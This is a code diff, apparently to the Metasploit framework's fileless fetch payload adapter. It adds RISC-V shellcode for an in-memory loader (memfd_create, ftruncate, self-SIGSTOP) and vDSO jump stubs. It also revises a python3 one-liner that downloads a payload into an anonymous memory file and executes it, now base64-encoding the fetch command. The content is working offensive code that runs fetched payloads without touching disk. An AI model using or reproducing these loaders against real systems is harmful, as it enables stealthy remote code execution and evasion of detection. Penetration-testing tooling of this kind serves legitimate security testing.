@@ -138,6 +138,48 @@ module Msf::Payload::Adapter::Fetch::Fileless
           0x0c010101, #0x1020:	syscall	0x40404	0x0c010101
 ]
       payload = in_memory_loader_asm.pack('N*')
+    when 'riscv64le'
+      # fd = memfd_create("")
+      # ftruncate(fd, 0)
+      # pid = getpid()
+      # kill(pid, SIGSTOP)
+      in_memory_loader_asm = [
+        0x00b5c5b3, # xor   a1, a1, a1         # a1 = 0 (flags)
+        0xff010113, # addi  sp, sp, -16        # allocate stack space
+        0x00b13023, # sd    a1, 0(sp)          # store "" on stack
+        0x00010513, # addi  a0, sp, 0          # a0 = &""
+        0x11700893, # addi  a7, x0, 279        # __NR_memfd_create
+        0x00000073, # ecall                    # fd in a0
+        0x02e00893, # addi  a7, x0, 46         # __NR_ftruncate (a1=0)
+        0x00000073, # ecall
+        0x0ac00893, # addi  a7, x0, 172        # __NR_getpid
+        0x00000073, # ecall                    # pid in a0
+        0x01300593, # addi  a1, x0, 19         # SIGSTOP
+        0x08100893, # addi  a7, x0, 129        # __NR_kill
+        0x00000073, # ecall                    # kill(pid, SIGSTOP)
+      ]
+      payload = in_memory_loader_asm.pack('V*')
+    when 'riscv32le'
+      # fd = memfd_create("")
+      # ftruncate(fd, 0)
+      # pid = getpid()
+      # kill(pid, SIGSTOP)
+      in_memory_loader_asm = [
+        0x00b5c5b3, # xor   a1, a1, a1         # a1 = 0 (flags)
+        0xff010113, # addi  sp, sp, -16        # allocate stack space
+        0x00b12023, # sw    a1, 0(sp)          # store "" on stack
+        0x00010513, # addi  a0, sp, 0          # a0 = &""
+        0x11700893, # addi  a7, x0, 279        # __NR_memfd_create
+        0x00000073, # ecall                    # fd in a0
+        0x02e00893, # addi  a7, x0, 46         # __NR_ftruncate (a1=0)
+        0x00000073, # ecall
+        0x0ac00893, # addi  a7, x0, 172        # __NR_getpid
+        0x00000073, # ecall                    # pid in a0
+        0x01300593, # addi  a1, x0, 19         # SIGSTOP
+        0x08100893, # addi  a7, x0, 129        # __NR_kill
+        0x00000073, # ecall                    # kill(pid, SIGSTOP)
+      ]
+      payload = in_memory_loader_asm.pack('V*')
 
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
@@ -204,6 +246,22 @@ module Msf::Payload::Adapter::Fetch::Fileless
     when 'mips64'
       %^"041100000000000001ce7026dfee001001c0000800000000"$(echo $(printf %016x $vdso_addr))^
     
+    # RISC-V 64-bit LE shellcode
+    # auipc t0, 0
+    # ld    t0, 12(t0)
+    # jr    t0
+    # .dword [target address]
+    when 'riscv64le'
+      %^"9702000083b2c20067800200"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+
+    # RISC-V 32-bit LE shellcode
+    # auipc t0, 0
+    # lw    t0, 12(t0)
+    # jr    t0
+    # .word [target address]
+    when 'riscv32le'
+      %^"9702000083a2c20067800200"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
@@ -245,8 +303,13 @@ def _generate_fileless_shell(get_file_cmd, arch)
 end
   
   # same idea as _generate_fileless function, but force creating anonymous file handle
+  #
+  # get_file_cmd is base64-encoded and decoded again inside the python one-liner, since it
+  # can contain shell metacharacters (e.g. the arch/endian query string) that would otherwise
+  # break out of the single-quoted `python3 -c '...'` argument it's embedded in.
   def _generate_fileless_python(get_file_cmd)
-    %Q<python3 -c 'import os;fd=os.memfd_create("",os.MFD_CLOEXEC);os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";#{get_file_cmd};$f&")'> 
+    encoded_get_file_cmd = Base64.strict_encode64(get_file_cmd)
+    %Q<python3 -c 'import os,base64;fd=os.memfd_create("",os.MFD_CLOEXEC);get_file_cmd=base64.b64decode("#{encoded_get_file_cmd}").decode();os.system(f"f=\\"/proc/{os.getpid()}/fd/{fd}\\";{get_file_cmd};$f&")'>
   end
   
    # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
